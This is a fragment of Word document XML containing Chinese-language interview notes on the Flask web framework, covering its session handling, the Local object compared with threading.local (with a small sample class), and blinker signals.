      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ModelForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD8EE1D" w14:textId="2E41EDFA"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073</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框架默认</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>处理机制？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5033C05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前提</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C67132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不熟的话</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记不太清了</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应该是</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分两个阶段吧</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4956FD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创建</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293EC67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当请求刚进来的时候</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会将</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>封装成一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>RequestContext()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="684F7B0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接下来把这个对象通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>LocalStack()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>放入内部的一个</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对象中</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2F61D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因为刚开始</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Local </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ctx</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是空的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C8FB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所以</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接着执行</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>open_session,</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>将</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">cookie </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>里面的值拿过来</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重新赋值到</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ctx</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="495B9C0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(Local</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>实现对数据隔离</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类似</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">threading.local) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A7E2B0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w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>销毁</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3544E3D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最后返回时执行</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> save_session() </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>将</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">ctx </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>读出来进行序列化</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写到</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="516AD226" w14:textId="4C8608FB"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然后给用户</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接着把</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> ctx pop</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>掉</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="560F7020" w14:textId="133AA5B1"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hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>74</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解释</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框架中的</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Local</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>对象和</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>threading.local</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>对象的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="294D532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a.threading.local</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="167B6BE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作用：为每个线程开辟一块空间进行数据存储</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数据隔离</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p>
    <w:p w14:paraId="17E7AFB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2E4C28A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问题：自己通过字典创建一个类似于</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>threading.local</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的东西。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ABFE16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storage = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E375E1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4740: {val: 0},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D20CC1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4732: {val: 1},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E41F8B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4731: {val: 3},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53EED84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0CEBC8D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4C8426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b.</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>自定义</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Local</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D3A87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作用：为每个线程</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协程</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开辟一块空间进行数据存储</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数据隔离</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F23E8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class Local(object):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5654EF4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__init__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="136D09E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object.__setattr__(self, 'storage', {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5922C8B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__setattr__(self, k, v):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267A61A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ident = get_ident()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4002243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if ident in self.storage:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D33D07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self.storage[ident][k] = v</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D1E69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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A88C60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self.storage[ident] = {k: v}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C223F8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def __getattr__(self, k):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08EC0C5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ident = get_ident()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A2277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return self.storage[ident][k]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D0F37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obj = Local()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48192A5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def task(arg):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="087B47F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obj.val = arg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C83D9B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obj.xxx = arg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69433FC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print(obj.val)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F2A57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for i in range(10):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC2767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t = Thread(target=task, args=(i,))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="682D5199" w14:textId="7B2B7B1B"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t.start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F50F890" w14:textId="6DC359B9"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075</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Flask</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> blinker </w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>是什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="005C6E0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flask</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的信号</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>blinker</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F5C17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信号主要是让开发者可是在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>flask</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求过程中定制一些行为。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="130C7BB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或者说</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>flask</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在列表里面预留了几个空列表，在里面存东西。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60F27F8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简言之，信号允许某个</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发送者</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通知</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接收者</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有事情发生了</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521367C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before_request</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>有返回值，</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>blinker</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>没有返回值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D80782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10</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>个信号</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="548D977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request_started = _signals.signal('request-started') #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求到来前执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56F8149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request_finished = _signals.signal('request-finished') #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求结束后执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="063A70F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before_render_template = _signals.signal('before-render-template')#</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模板渲染前执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B0DAA7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template_rendered = _signals.signal('template-rendered')#</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模板渲染后执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2650C00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got_request_exception = _signals.signal('got-request-exception') #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求执行出现异常时执行</w:t>
      </w:r>
    </w:p>
